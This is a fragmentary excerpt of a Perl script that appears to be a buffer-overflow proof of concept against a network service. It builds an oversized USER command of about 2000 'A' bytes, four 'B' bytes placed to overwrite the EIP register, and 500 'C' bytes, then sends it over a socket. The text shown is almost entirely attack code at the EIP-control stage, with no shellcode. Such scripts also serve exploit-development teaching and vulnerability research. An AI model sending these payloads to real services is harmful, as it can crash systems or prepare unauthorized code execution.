...
# 4 BBBB's
# This is to demonstrate we can place 4 B's into the EIP Register
$eip		= "\x42" x 4;
...
# USER AAAA(2000+)AAAABBBBCCCC(500)CCCCC
...
# E.g., USER AAAA(2000+)AAAABBBBCCCC(500)CCCCC
$socket->send($string);
print "===> [Sending USER AAAA($COUNT)AAAA\'s...BBBBCCCC(500)CCCCC]\n";
